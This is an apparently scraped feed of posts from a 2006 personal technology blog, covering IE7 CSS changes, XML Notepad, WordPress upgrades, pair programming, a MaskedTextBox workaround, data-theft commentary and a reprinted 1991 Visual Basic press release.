<p>This seems to be a clean, simple solution to an annoying &#8220;feature&#8221; - one I&#8217;ll certainly be using.</p>

<p><strong><em>Update</em></strong>: It looks like the original page has been removed, but you can still access the files <a href="http://sourceforge.net/project/showfiles.php?group_id=88417">here</a>.</p>

      <title>Detailed CSS Changes in IE7</title>
      <description><p>As <a href="http://www.microsoft.com/windows/ie/ie7/about/default.mspx">IE7</a> approaches release, the <a href="http://blogs.msdn.com/ie/default.aspx">IE team</a> has released a detailed list of the <a href="http://blogs.msdn.com/ie/archive/2006/08/22/712830.aspx">200+ CSS changes</a> that will appear in the final release. If you do any web development, this is a great time to read the list and audit the CSS that your sites use. IE7 breaks many of the old hacks used to work around the bugs in previous versions, so careful attention will be needed to ensure everything keeps working and looking as intended.</p>

<p>IE7 is a major step forward, and all web developers owe the IE team a &#8216;thanks&#8217; for being so transparent in this process and making detailed change lists such as this one available.</p>

      <title>XML Notepad 2006</title>
      <description><p><a href="http://adamcaudill.com/files/2006/09/sc22708156232.png"><img src="http://adamcaudill.com/files/2006/09/sc22708156232b.png" alt="XMLNotepad 2006" /></a> Microsoft&#8217;s Chris Lovett (of System.Xml fame) has released <a href="http://www.microsoft.com/downloads/details.aspx?FamilyID=72d6aa49-787d-4118-ba5f-4f30fe913628&amp;DisplayLang=en">XML Notepad 2006</a> - a simple, easy to use, and free, XML editor. For those that regularly work with XML, an editor of this type can be an invaluable addition to your toolbox.</p>

<p>XML Notepad offers a basic set of features, great for those quick jobs where using an IDE or a more full-featured application would be overkill. While XML Notepad doesn&#8217;t offer a great range of features, it does offer some of the most important features needed to get the job done.</p>

<p>As a real bonus, XML Notepad was released complete with its design documentation and source code. Always nice to take a peak under the hood of the projects Microsoft releases.</p>

<p>The only major gripe I have with this tool is the lack of a syntax-highlighted viewer for the XML source. In fact, it uses its non-XML cousin, Notepad to view the underlying XML. Thankfully, as this project was released with source, it should be easy to add a few new features such as this.</p>

<p>For those interested, here&#8217;s the feature overview:</p>

<ul>
<li><p>Tree View synchronized with Node Text View for quick editing of node names and values.</p></li>
<li><p>Incremental search (Ctrl+I) in both tree and text views, so as you type it navigates to matching nodes.</p></li>
<li><p>Cut/copy/paste with full namespace support.</p></li>
<li><p>Drag/drop support for easy manipulation of the tree, even across different instances of XML Notepad and from the file system.</p></li>
<li><p>Infinite undo/redo for all edit operations.</p></li>
<li><p>In place popup multi-line editing of large text node values.</p></li>
<li><p>Configurable fonts and colors via the options dialog.</p></li>
<li><p>Full find/replace dialog with support for regex and XPath.</p></li>
<li><p>Good performance on large XML documents, loading a 3mb document in about one second.</p></li>
<li><p>Instant XML schema validation while you edit with errors and warnings shown in the task list window.</p></li>
<li><p>Intellisense based on expected elements and attributes and enumerated simple type values.</p></li>
<li><p>Support for custom editors for date, dateTime and time datatypes and other types like color.</p></li>
<li><p>Handy nudge tool bar buttons for quick movement of nodes up and down the tree.</p></li>
<li><p>Inplace HTML viewer for processing xml-stylesheet processing instructions.</p></li>
<li><p>Built-in XML Diff tool.</p></li>
</ul>

      <title>Hosting Woes and Down Time</title>
      <description><p>Over the last couple days my various web sites have seen far more downtime than normal. My hosting provide, <a href="http://radicalv.com/">Radical Vision</a> has apparently been having issues with the MySQL server that powers not only this blog, but even their <em>support system</em>.</p>

<p>Yep, you heard me right, the support system that you have to use to contact them about any issues relies on MySQL, the very same instance that everybody else uses. The same one that was down for several hours today. What&#8217;s the point of a support system if you can&#8217;t report issues?</p>

<p>Yesterday&#8217;s outage was blamed on a bad script being ran by another user, as for today, I&#8217;ve yet to hear a word.</p>

<p>When I opened my account with RadicalV almost three years ago, you could simply email a support address and expect a response within a couple minutes. Then, &#8220;to provide better support&#8221; they disabled this simple support system and replaced it with a web page. Now, this is easy to use, and I&#8217;m sure that it makes their lives easier, but what about the life of the customers on days like today?</p>

<p>Now, I still firmly believe that RadicalV is the best hosting service I&#8217;ve used, and I&#8217;m still impressed with the support. Where many hosting services respond to support questions within a day, RadicalV typically responds within an hour or two. I guess like all good companies, they grow up and change focus. The days of the 5 minute support response are over.</p>

<p>It&#8217;s too bad, and if the downtime continues as it for the last month or two, perhaps my $35 a month will go to someone else.</p>

      <title>VB.NET 2005 Performance Issues</title>
      <description><p>Seeing slowdowns in large VB 2005 projects? Well, I think I just found <a href="http://www.panopticoncentral.net/archive/2006/08/03/13539.aspx">the answer</a>. There&#8217;s now a <a href="http://support.microsoft.com/kb/920805/en-us">QFE released</a> that may help address these issues. One of the applications I maintain is a 25,000 line solution made up of 9 projects, I&#8217;m hoping this fix will resolve the issues we&#8217;ve seen compiling it (not to mention the frequent <a href="http://www.paulstovell.net/Posts/Post.aspx?postId=5d7312bc-80fa-4ce3-b69e-12d55857d502">compiler</a> <a href="http://support.microsoft.com/kb/915038/en-us"> crashes</a>).</p>

<p>Here&#8217;s the list of symptoms addressed:</p>

<ul>
<li><p>You experience a slow response time when you use single-step debugging. For example, the response time is slow when you press F10 to step into a line of code.</p></li>
<li><p>You experience a slow response time when the Error List or the Task List is updated by Visual Studio 2005.</p></li>
<li><p>You experience a slow response time when you use the IntelliSense feature.</p></li>
</ul>


<p>Once I hear back from Microsoft support, I&#8217;ll post details if it makes any difference.</p>

      <title>WordPress 2.0.4</title>
      <description><p>It&#8217;s upgrade time again, <a href="http://wordpress.org/development/2006/07/wordpress-204/">WordPress 2.0.4</a> has been <a href="http://wordpress.org/download/">released</a> (<a href="http://markjaquith.wordpress.com/2006/07/30/wordpress-204-upgrade-changed-files-zip-changes-diff-changed-files-list/">changed files list &amp; zip</a>), and after a fairly painless upgrade (<a href="http://codex.wordpress.org/Upgrading_WordPress#Upgrade_2.0.3_to_2.0.4">instructions</a>, though I didn&#8217;t follow the method they suggest), seems quite stable. This release sports over <a href="http://trac.wordpress.org/query?status=closed&amp;milestone=2.0.4">60 changes</a>, clearing up a fair number of small issues, as well as a few security fixes.</p>

<p>If you have a WordPress powered blog, it&#8217;s worth the upgrade.</p>

      <title>What It Takes To Be A Great Developer</title>
      <description><p>Recently a programmer I know decided that it was time for a career change, leaving the IT field entirely. This gave me cause to think; what does it take to be a great developer. Many people go through school believing they have what it takes, only to receive a rude awaking once they enter the real world.</p>

<p>Before I go on, I think it&#8217;s important to define what I mean by developer, and the differences between a developer and a programmer. Here are a few key aspects that every great developer most possess:</p>

<ul>
<li><p>Is able to take a very basic list of requirements and develop a stable and maintainable application design and architecture.</p></li>
<li><p>Understands that working with end users is critical in creating great software.</p></li>
<li><p>Has an intense desire to not just learn, but to know everything about the field they work in.</p></li>
<li><p>Loves software, and creating it.</p></li>
</ul>


<p>There are many programmers, but developers are fewer but add far more value than a programmer. <a href="http://software.ericsink.com/entries/No_Great_Hackers.html">Eric Sink</a> defines a developer as &#8221;<em>programmers who also contribute in non-coding ways</em>&#8221; - I think it&#8217;s important to understand that coding is just one part of creating great software, and the great <a href="http://www.acm.org/ubiquity/views/v7i07_pfeiffer.html">user experience</a> that goes with it.</p>

<p>But I digress, back to the topic. When new programmers come out of school, they often have little idea of what the industry is truly like. They often believe that they have a strong understanding of the industry, the methods and techniques used, and what life will be like working as a programmer. The reality they expect many times doesn&#8217;t resemble the reality they experience.</p>

<p>To succeed, new programmers need to expand their knowledge and try to become true developers, not just programmers. Unless they find jobs at a major software development company, such as Microsoft, odds are they will need these extra skills to get ahead.</p>

<p>Learning how to better troubleshoot issues, working with end users that are having issues, or have ideas for changes will be a step forward to become a developer. Another item to focus on is finding an understanding of  design and architecture so that they are more capable of designing a maintainable large-scale application; a key value for small development groups.</p>

<p>To be a great developer, programmers must have a passion for software, both in using and creating. This is something missing in many of the recent graduates I&#8217;ve met. These are the programmers that will end up going the route of changing careers; those without a passion simply won&#8217;t make it.</p>

<p>_Note: This is from the perspective of small software teams; larger groups may have somewhat different priorities.</p>

      <title>Useful Notepad Tip</title>
      <description><blockquote><p><img src="http://adamcaudill.com/files/2006/07/NotepadFeature2.png" alt="Notepad Feature" /></p></blockquote>

<p>Here&#8217;s a great little feature I just <a href="http://www.downloadsquad.com/2006/07/07/weird-hidden-notepad-feature-create-a-log-file/">heard about</a> to make the always useful though mostly featureless Notepad utility even more useful. If you create a new file and put &#8221;<code>.LOG</code>&#8221; (case-sensitive) as the first thing in the file, each time you open the file after that it will append a timestamp to the end of the file. While you could just press the &#8221;<code>F5</code>&#8221; button to insert the timestamp, this does have the advantage of added simplicity.</p>

<p>Microsoft has a <a href="http://support.microsoft.com/?kbid=260563">knowledge base article</a> on this feature, it indicates that the feature is supported on Windows 98 &amp; Me, but my tests indicate it is also present in 2000 &amp; XP.</p>

<p>This is a great feature if you need to keep manual logs, I think this just might come in handy.</p>

      <title>In Comes The Schwag</title>
      <description><p>The <a href="http://valleyschwag.com/chronicles/2006/06/30/shipping-in-progress/">third edition</a> of <a href="http://valleyschwag.com/">ValleySchwag</a> has arrived. Yet again, there is a nice collection of goodies - well worth the membership fee.</p>

<blockquote><p> <a href="http://flickr.com/photos/adamcaudill/184344418/"><img src="http://static.flickr.com/75/184344418_35f010144c_m.jpg" alt="The Schwag Pile" /></a></p></blockquote>

<p>While a bit less loaded than <a href="http://adamcaudill.com/2006/05/30/valleyschwag-delivers/">last time</a> , I&#8217;m still quite impressed with the package they&#8217;ve put together. The two big hits this time are the rather cool shirt from <a href="http://www.imeem.com/">imeem</a> and the laptop bag (see below) from <a href="http://www.mi6conference.com/index.htm">MI6</a>. While the bag doesn&#8217;t have the padding of my regular bag, it&#8217;s a <em>lot</em> lighter, so I know it&#8217;ll see some use.</p>

<blockquote><p><a href="http://flickr.com/photos/adamcaudill/184344362/"><img src="http://static.flickr.com/70/184344362_ddce00d669_m.jpg" alt="The small stuff" /></a>    <a href="http://flickr.com/photos/adamcaudill/184344472/"><img src="http://static.flickr.com/56/184344472_8e7b7867f5_m.jpg" alt="The bag from MI6" /></a></p></blockquote>

<p>All in all, I&#8217;m quite happy with this months package, and I&#8217;ll certainly be looking forward to the next round. For those interested, here&#8217;s a list of vendor&#8217;s that provided something cool for this months package:</p>

<ul>
<li><p><a href="http://www.imeem.com/">imeem</a> - Mostly-cool t-shirt</p></li>
<li><p><a href="http://www.mi6conference.com/index.htm">MI6</a> - The laptop bag pictured above.</p></li>
<li><p><a href="http://www.jeteye.com/">jeteye</a> - A useful little pen (the clicky type, that are so useful for annoying those in near-by cubicles).</p></li>
<li><p><a href="http://channel9.msdn.com/">Channel 9</a> - Microsoft&#8217;s Channel 9 provided a highly throw-able version of their mascot, <em>Channel 9 Guy</em>.</p></li>
<li><p><a href="http://www.adobe.com/">Macromedia</a> - A might-be-useful-someday key chain (bottom left corner of the picture above.</p></li>
<li><p>There are also about 5 other companies that provided stickers.</p></li>
</ul>

<p>If the default calculator included with Windows doesn&#8217;t cut it for you, and you need more muscle than <a href="http://www.microsoft.com/windowsxp/downloads/powertoys/xppowertoys.mspx">Power Calculator</a> packs, then <a href="http://www.microsoft.com/globaldev/outreach/dnloads/calcplus.mspx">Microsoft Calculator Plus</a> just might be for you. This  Calculator replacement offers all the classic functionality plus quite a few new tools. Great little tool for your laptop to use when <a href="http://www.googleguide.com/calculator.html">Google Calculator</a> isn&#8217;t an option.</p>

<p>Note: For those that don&#8217;t like the look, just go to &#8220;View > Classic View&#8221; to go to the more traditional style.</p>

      <title>Demise of The WWW</title>
      <description><p>The WWW is dying - no, not the web itself, but the ubiquitous WWW prefix on many domains. While there have been <a href="http://no-www.org/">efforts</a> to encourage developers to move away from the use of this prefix for some time, this movement seems to be gaining ground.</p>

<p><a href="http://photomatt.net/">Matt Mullenweg</a> of <a href="http://wordpress.org/">WordPress</a> fame has released a plug-in to <a href="http://photomatt.net/2006/06/13/wordpress-no-www/">automatically remove the WWW prefix</a>. While this isn’t earth shattering news, it does show a trend away from the traditional prefixes to a simpler model. A change that I certainly welcome.</p>

<p>From the day this site went online it’s removed the WWW if used, providing a single, <a href="http://wisdump.com/webmastering/benefits-of-removing-www-from-your-url/">optimized</a> URL for all pages. Now that methods to implement such functionality are becoming so simple, I expect it will become even more common as bloggers adopt a single URL model (hopefully the non-WWW form).</p>

      <title>Of Victory and Pair Programming</title>
      <description><p>It&#8217;s been 3 weeks, 450 man-hours and 6,880 lines of code, and it&#8217;s done.</p>

<p>Working as a developer for a call center, I often see some interesting and rather challenging projects. The latest is no different. One of our largest clients (a major bank) asked us to develop an application to assist in processing credit card applications.</p>

<p>While the original request seemed simple, the final specification though was far less simple. A highly dynamic, intelligent, and multi-language application was needed. It’s been close to three months since development started, and 3 weeks since the current major update was started.</p>

<p>Weighing in at 22,880 lines - this is a rather large application, highly dynamic, fault tolerant, and has complete multi-lingual support.  Built in VB.NET and based on the .NET Framework 2.0, this is the largest .NET application I’ve seen though to production.</p>

<p>Not only was this one of the larger .NET applications I&#8217;ve worked on, this is also the first project I&#8217;ve worked on using a <a href="http://www.pairprogramming.com/">Pair Programming</a> methodology. I joined the project about 1/4th into the initial development, and since then I’ve been working extensively with <a href="http://www.verbalclay.com/blog">Laura</a> to complete the project.</p>

<p>After reading about the <a href="http://www.gamesfromwithin.com/articles/0602/000104.html">methods used</a> by <a href="http://highmoonstudios.com/">High Moon Studios</a>, Laura and I decided to attempt <a href="http://verbalclay.drunkenhyena.com/blog/2006/05/05/extreme-programming/">pair programming</a>. In March when this project was first mentioned, we decided this would be the ideal project to go forward with this experiment.</p>

<p>To ease development, I acquired an <a href="http://reviews.cnet.com/HP_Pavilion_533w_C_2_GHz/4507-3118_7-30381630.html?tag=nav">HP desktop</a> (with a few <a href="http://www.bestbuy.com/site/olspage.jsp?skuId=6308131&amp;type=product&amp;id=1074787987929">upgrades</a>) and Laura provided a pair of keyboards and mice for use as a development workstation. With two developers at a single computer, the boost in productivity is remarkable. While I always believed that pair programming could not add significantly to productivity, the quality and speed of development of this project proved me wrong.</p>

<p>With nearly 23,000 lines of fully optimized code, and early testing showing remarkably few bugs, the short development timeframe makes this a remarkable project. When this project started I wouldn’t have dared to dream we could achieve so much, so quickly.</p>

<p>Looking back at the progress made, I&#8217;m now a believer that pair programming is the way to go. While I still have many reservations about the concepts of <a href="http://en.wikipedia.org/wiki/Extreme_Programming">Extreme Programming</a>, at least this aspect is a good idea.</p>

      <description><p>Could it really be? <a href="http://www.newspress.com/Top/Article/article.jsp?Section=BUSINESS&amp;ID=564747487697831688">Rumors</a> are <a href="http://oraclewatch.eweek.com/blogs/google_watch/archive/2006/06/06/10601.aspx">flying</a> that tomorrow (Tuesday) Google will open a beta for a new spreadsheet tool. This is quite a move, and one that will certainly turn up the heat on the Microsoft - Google rivalry.</p>

<p>Google Spreadsheet will have support for the Excel file format, a move that seems to be setting a direct course for competing with the ever popular Microsoft Office suite. When combined with the launch of <a href="http://calendar.google.com/">Calendar</a> and the acquisition of <a href="http://www.writely.com/">Writely</a>, Google seems to have an eye of the market now controlled by Office.</p>

<p>Reports are that at 9AM, EDT <a href="http://labs.google.com/">Google Labs</a> will be linking to the new application and allowing a limited number of sign-ups.</p>

      <title>Blog Traffic: Another View</title>
      <description><p>There are hundreds of guides on how to get more traffic directed to your blog, and most are wrong. <a href="http://sethgodin.typepad.com/seths_blog/2006/06/how_to_get_traf.html">Seth Godin</a> recently posted on this topic, and I have to disagree with most of his points. While there are a few basically good ideas, there are many more that I just don&#8217;t see holding up.</p>

<p>Here&#8217;s what I look for in the blogs I visit:</p>

<ul>
<li><p><strong>Writer is an expert in the field.</strong> If the writer seems to have only a passing knowledge of the subject, I typically don&#8217;t return.</p></li>
<li><p><strong>Articles are of a reasonable length.</strong> If the articles are too short they don&#8217;t contain enough information to be of use, on the other hand if they are too long, they require too much of a time investment. I&#8217;ve found that 600-1,000 words typically works out well for most items.</p></li>
<li><p><strong>Don&#8217;t write about things nobody cares about.</strong> Many people are tempted to write about things that nobody else cares about, if it won&#8217;t benefit the bulk of your readers, then it&#8217;s probably not worth writing about.</p></li>
<li><p><strong>Keep to a single, basic topic.</strong> I look for blogs that follow topics I&#8217;m interested in, the further it strays from what I care about; the less likely I&#8217;ll come back. For me, I care about technology, not the writer&#8217;s local news, the more news posts, the less the odds of me coming back.</p></li>
<li><p><strong>Keep is site simple and useful.</strong> If the site is <a href="http://www.codinghorror.com/blog/archives/000587.html">too complex</a>, it distracts from the quality of the work being published. The site should have a <a href="http://www.plaintxt.org/themes/blogtxt/">simple theme</a> and not be overload with useless links or <a href="http://web-graphics.com/mtarchive/001736.php">icons</a>.</p></li>
<li><p><strong>Be transparent.</strong> I like blogs were the writer exposes a bit of herself, don&#8217;t be afraid to post your name or who you work for. The more information authors posts about themselves the more credibility they have.</p></li>
<li><p><strong>The site can&#8217;t be an ad-farm.</strong> I&#8217;m not a fan of ads, but I understand high traffic sites are expensive to run. If the site looks like its only purpose is making money from ads, I won&#8217;t stick around. In most cases, if there are any banner ads, or more than two text ads, I&#8217;ll probably lose interest. Ad locations and colors should be carefully selected, if done properly, they add value, if done carelessly, they will kill reader loyalty.</p></li>
</ul>


<p>This is by no means a formula to get millions of hits, just my view on what I look for, and the rules I try to follow. Each blog is different, and the readers of the topic you are writing about will determine what works and what doesn&#8217;t. Just try to make sure you&#8217;re writing about what people care about.</p>

<p>Focus on your readers, not your traffic. If you focus on providing a great resource for people, the high-quality traffic will follow. People matter more than the numbers, that&#8217;s what all bloggers need to stay focused on.</p>

      <title>Blue Hole Waterfall</title>
      <description><blockquote><p> <a href="http://flickr.com/photos/89756004@N00/159759269/"><img src="http://static.flickr.com/76/159759269_81b1db659b_m.jpg" alt=" " /></a></p></blockquote>

<p>Taking a rather extended lunch break today, I went to the <a href="http://www.cs.utk.edu/~dunigan/landforms/m.php?wpt=CTF001">Blue Hole waterfall</a> near Elizabethton in east Tennessee. What a sight!</p>

<p>I know my policy is to avoid blogging about things not related to the IT/Software Development industry, but this sight is certainly worth breaking the policy. If you like waterfalls, or just &#8216;getting away&#8221; this is a great place to go. If you&#8217;d like to see more, I&#8217;ve uploaded a <a href="http://flickr.com/photos/89756004@N00/sets/72157594154722533/">few pictures</a> to my <a href="http://flickr.com/photos/adamcaudill/">Flickr page</a>.</p>

<p>Speaking of Flickr, in a previous life I worked as a photographer and as such I&#8217;ve built up quite a collection, over the next few weeks I&#8217;ll be scanning parts of my collection and uploading them. They cover a wide range of topics, so odds are you&#8217;ll find something you like. Just as a note, I&#8217;ve added a link to my Flickr page in the &#8220;Sites&#8221; list as &#8220;My Photos&#8221; on the left panel.</p>

      <title>Data Theft: It&#39;s happened again</title>
      <description><p>Somehow, <a href="http://www.betanews.com/article/Laptop_Theft_Exposes_243k_Credit_Cards/1149268788">this story</a>  sounds familiar. A total of 243,000 credit card numbers stolen, that many more potential victims. Yet, they are far from alone, just a few weeks ago, data (including social security numbers) for <a href="http://www.cnn.com/2006/US/05/23/vets.data/">26 million vets</a>  was stolen. This is becoming an ugly trend.</p>

<p>No matter how many <a href="http://www.yafla.com/dforbes/2006/05/23.html#a313">reminders</a>, it seems the message never makes it through. There is no shortage of <a href="http://www.google.com/search?q=encryption+software">products</a>  that would have made both of these stories much less important, but it both cases there was no real attempt to protect the data. If the data had been encrypted, it&#8217;s likely that there would be no real risk to the public. But that wasn&#8217;t the case.</p>

<p>Due to bad and poorly enforced policies, laziness, and a lack of understanding, millions are at risk. Small mistakes can have a massive impact, when dealing with private data, take every possible measure to ensure it stays private.</p>

      <title>WordPress Update</title>
      <description><p>The <a href="http://wordpress.org/">WordPress</a> team has <a href="http://wordpress.org/development/2006/06/wordpress-203/">released 2.0.3</a> of the massively popular blogging software. The primary reason is a security fix, but also includes a few performance tweaks. The install process was fairly painless thanks to the work of <a href="http://markjaquith.wordpress.com/2006/06/01/wordpress-203-upgrade-changed-files-zip-changes-diff-changed-files-list/">Mark Jaquith</a>, using the provided patch reduced the total upgrade time to under an hour.</p>

<p>For the average WordPress user that doesn&#8217;t have any modified files, the install should take only a couple minutes. It&#8217;s a very simple process, if you haven&#8217;t updated, you should.</p>

      <title>Valleyschwag Delivers</title>
      <description><p><a href="http://valleyschwag.com/">Valleyschwag</a> has delivered! There for a couple days I was worried as the middle of the month went by without a word, but on Friday, <a href="http://valleyschwag.com/chronicles/2006/05/26/the-may-issue/">word went out</a> that the <a href="http://adamcaudill.com/2006/05/26/the-schwag-has-shipped/">schwag shipped</a>. And today, just four days later, it has arrived.</p>

<blockquote><p> <a href="http://adamcaudill.com/files/2006/05/P5300003.JPG"><img src="http://adamcaudill.com/files/2006/05/P5300003.thumbnail.JPG" alt="The Package" /></a>   <a href="http://adamcaudill.com/files/2006/05/P5300004.JPG"><img src="http://adamcaudill.com/files/2006/05/P5300004.thumbnail.JPG" alt="The holy grail of schwagdom" /></a></p></blockquote>

<p><a href="http://adamcaudill.com/files/2006/05/P5300005.JPG"><img src="http://adamcaudill.com/files/2006/05/P5300005.thumbnail.JPG" alt="The first glimpse" /></a>     <a href="http://adamcaudill.com/files/2006/05/P5300006.JPG"><img src="http://adamcaudill.com/files/2006/05/P5300006.thumbnail.JPG" alt="Schwag!" /></a></p>

<p>I&#8217;ll admit, I was a bit unsure about this idea at first, but now that I&#8217;ve got my hands on this pile o&#8217; goodies, I&#8217;m hooked. Not only is Valleyschwag a great marketing idea, but so far has proved to be a great service. Here&#8217;s a breakdown of the goodies:</p>

<ul>
<li><p>A <em>very</em> cool <a href="http://www.sixapart.com/movabletype/">MovableType</a> hat &amp; key-chain/necklace thing.</p></li>
<li><p>the signature <a href="http://rubyredlabs.com/">Ruby Red</a> t-shirt.</p></li>
<li><p>A <a href="http://www.typepad.com/">TypePad</a> t-shirt. (Seems <a href="http://www.sixapart.com/">Six Apart</a> really likes this schwag thing.)</p></li>
<li><p>A pack of puzzle cards from <a href="http://www.perplexcity.com/">PerplexCity</a>.</p></li>
<li><p>A pencil from <a href="http://www.livejournal.com/">LiveJournal</a>.</p></li>
<li><p>Stickers from: <a href="http://www.feedburner.com/">FeedBurner</a>, <a href="http://www.eff.org/">EFF</a>, and <a href="http://www.goatsesticker.com/home.html">Goatse</a>.</p></li>
<li><p>A temporary tattoo from <a href="http://www.abazab.com/">abazab</a>.</p></li>
</ul>


<p>For $14.99, this is a great deal, the hat alone made it worth it (the hat is definitely my favorite piece). Yeah, it&#8217;s official, I&#8217;m a fan.</p>

      <title>Responsibility meets Marketing</title>
      <description><p>While this is probably more about marketing than anything, Anti-Virus vendor <a href="http://www.ca.com/">Computer Associates</a> is offering a <a href="http://www.my-etrust.com/Microsoft/vista/default.aspx">free one year subscription</a>  (<a href="http://www3.ca.com/press/PressRelease.aspx?CID=88876&amp;culture=en-us">press release</a>) of it&#8217;s <a href="http://store.digitalriver.com/servlet/ControllerServlet?Action=DisplayPage&amp;Locale=en_US&amp;id=ProductDetailsPage&amp;SiteID=caconsum&amp;productID=35180700">EZ Antivirus</a> product to beta testers of Windows Vista.</p>

<p>This is the type of responsibility that more vendors should accept, there are thousands of Vista boxes now running, and one can only guess how many have no form of virus protection in place. CA is not only making a great business decision, they are also helping to serve the community by reducing the number of unprotected systems connected to the internet.</p>

<p>It&#8217;s good to see a company like CA make this kind of move, anytime a company as large as CA is able to see beyond the bottom line, everybody stands to win.</p>

      <title>MaskedTextBox Madness</title>
      <description><p>Over the last couple days, most of my time has been devoted to the <code>MaskedTextBox</code> control, and one very annoying bug. The issues revolves around the way the control deals with currency. When provided with a mask such as &#8217;<code>$999,999,999</code>&#8217; - you&#8217;d expect it to exercise some degree of intelligence. That expectation turned out to be <em>quite</em> wrong.</p>

<p>If you type the number &#8216;50&#8217; in a box with that mask, you&#8217;ll end up with &#8216;$500,000,000&#8217; - for a financial application such as the one I&#8217;m working on, that could lead to a major issue. The only way to get the proper value is to set the cursor two places from the right. So if the user doesn&#8217;t pay attention, it&#8217;ll be simple to enter a value that is completely wrong.</p>

<p>To add insult to injury, when the control receives focus, it has a habit of setting focus to the end of the mask, where the user can not type due to the length restriction. So the user has to move the cursor to the desired location before they can start to type, and if thy just start typing, the control happily ignores them.</p>

<p>After testing a couple possible solutions (<a href="http://blogs.msdn.com/irenak/archive/2006/03/21/556434.aspx">this</a> and <a href="http://www.c-sharpcorner.com/UploadFile/mgold/MaskedCurrencyTextBox08142005135643PM/MaskedCurrencyTextBox.aspx?ArticleID=3dc8ca4b-7166-4851-ab40-a2150c5ca787">this</a>) it soon became clear that the <code>MaskedTextBox</code> is too limited in features to be useful for currency. That simple.</p>

<p>My solution to this was to drop the Masked control and create a new control inherited from <code>TextBox</code> that supports a few extra features such as:</p>

<ul>
<li><p>Numeric only input</p></li>
<li><p>Minimum Value</p></li>
<li><p>Maximum Value</p></li>
<li><p>Format String support</p></li>
</ul>


<p>With less than 30 lines of code, the basic control was in place. I wish I could include a proper answer for this issue to make the <code>MaskedTextBox</code> useful, but after loosing two days, I can safely say it&#8217;s too limited to be of real value for even slightly complex uses.</p>

      <title>Internet Explorer 7+</title>
      <description><p><img src="http://adamcaudill.com/files/2006/05/ie7_h2_rgb.jpg" alt="IE7+ Logo" /></p>

<p>Microsoft has <a href="http://blogs.msdn.com/ie/archive/2006/05/26/608255.aspx">announced</a> the naming of the Windows Vista edition of IE. Internet Explorer 7+ will be the name used to refer to the Vista edition, while 7 (minus the plus) will be used to reference the non-Vista edition. While the name has been changed for Vista, this seems to mostly be about marketing (or communication) as the User-Agent for both edition will contain &#8221;<code>MSIE 7.0</code>;&#8221; - no plus.</p>

<p>Also detailed, are the features that won&#8217;t make it to the XP edition of 7, they are as follows:</p>

<ul>
<li><p><a href="http://blogs.msdn.com/ie/archive/2005/09/20/471975.aspx">Protected Mode</a></p></li>
<li><p><a href="http://blogs.msdn.com/ie/archive/2006/03/01/541701.aspx">Parental Controls</a></p></li>

      <title>Happy (Belated) Birthday VB!</title>
      <description><p>To celebrate 15 years of Visual Basic, a quick glance to the past:</p>

<blockquote><p><em>Microsoft Announces Visual Basic at Windows World &#8216;91 General-Purpose, High-Productivity Programming System for Microsoft Windows</em></p></blockquote>

<p><em>ATLANTA &#8211; May 20, 1991 &#8211; Microsoft today announced MicrosoftR Visual BasicTM programming system at the Windows World &#8216;91 industry trade show.  Visual Basic is a graphical application development system for Microsoft WindowsTM graphical environment version 3.0 that combines visual design tools with a powerful, general-purpose programming language and Windows .EXE compiler.  It provides a simple solution to the complex task of creating real Windows-based software applications.</em></p>

<p>_&#8221;We set out to create the fastest, easiest way to program for the Windows environment,&#8221; said Bill Gates, Microsoft founder and CEO.  &#8220;My goal from the start was to make developing Windows applications as easy and natural as possible.  We also wanted this tool to appeal to a broad spectrum of people interested in programming for Windows &#8211; from professional corporate programmers and consultants solving business problems to independent software vendors and casual programmers.&#8221;</p>

<p>Visual Basic programming system combines a rich, event-driven programming model with the world&#8217;s most widely used programming language in a tightly integrated package.  General development for the Windows environment is faster than ever.  The Visual Basic programming system provides visual user-interface design capabilities with powerful general-purpose programming tools, making it easy for any programmer to create compiled Windows .EXE files that can be freely distributed without run-time fees or royalties of any kind.</p>

<p>&#8220;This is the most important software product of the year, if not the decade,&#8221; said Steve Gibson, president of Gibson Research Inc.  &#8220;It&#8217;s the ultimate intellectual tool. Thanks to Visual Basic, both casual and professional programmers can produce compelling and beautiful results. Now it&#8217;s easy to put together real Windows version 3.0 applications.&#8221;</p>

<p>&#8220;We needed to create an application that incorporated Microsoft Word for Windows and Microsoft Excel,&#8221; said Craig Ellis, senior programmer analyst, Reuters Information Systems.  &#8220;Visual Basic was the tool to do this.  It filled our needs, allowed us to develop a fast and effective application and cut our development time by more than half.  It&#8217;s a fantastic product that allowed us to incorporate a family of Microsoft products into one application.&#8221;</p>

<p>The Visual Basic programming system can be used to develop any Windows-based application, including corporate business systems, tools and utilities, front ends to data (mainframe, server and local) or commercial Windows software products.  It is also useful for integrating multiple Windows-based applications and for automating software testing through dynamic data exchange (DDE).</p>

<p>Visual Basic programming system provides visual design tools for creating the user interface components &#8211; windows and dialogs &#8211; of an application.  A full set of Windows interface components (including command buttons, text fields, list boxes, pictures, drop-down menus and file system controls) are created visually, without writing any code.  The forms engine for building the interface incorporates technology acquired from Cooper Software.  A powerful, structured programming language is then used to add functionality to these interface components, responding to events that are automatically trapped by the system.</p>

<p>The Visual Basic language is a derivative of the Microsoft QuickBasicTM modern programming system, modified for the graphical environment and the event-driven programming language.  It uses a threaded p-code incremental compiler and source-level debugging tools, including an interactive immediate window, in a tightly integrated system.</p>

<p>Extensibility</p>

<p>Support is provided for DDE, the mechanism for exchanging data with other Windows-based applications.  The Visual Basic system also supports dynamic link libraries (DLLs), which allow the user to establish links with other Windows systems facilities and call the Windows API or routines written in other languages and compiled into DLLs.  The control set itself can be extended by developers using C and the Windows SDK and the Microsoft Visual Basic Control Development Kit, available separately.  This extensibility will provide the ability to fully integrate new user interface components into the graphical design and code development environment.  Examples could include multimedia, pen controls and data access.</p>

<p>Printed documentation and online Help provide step-by-step instructions for writing programs.  The online Help system provides context-sensitive reference information and sample code that can be copied and pasted into a Visual Basic program.  An icon library of approximately 400 designs and an icon editor written in Visual Basic language are also included.  &#8220;The built-in help is excellent,&#8221; said Lee Perryman, deputy director of Associated Press Broadcast Services in Washington, D.C.  &#8220;The debugging features are superb, and the controls are rich and feature-packed.  Because there is almost no learning curve for users familiar with the Basic language, Visual Basic makes Windows programming a snap.&#8221;</p>

<p>Visual Basic programming system for Windows will be available in June 1991 for a suggested retail price* of $199.  German and French versions are expected to ship in August, with other foreign language versions to follow.</p>

<p>The Visual Basic programming system runs in either the standard or enhanced mode of Microsoft Windows graphical environment version 3.0 or higher.  The system requirements include a personal computer using 80286 processor or higher; hard disk; mouse; CGA, EGA, VGA, 8514, HerculesR or compatible display; MS-DOSR operating system version 3.1 or later and one or more megabyte of memory.</p>

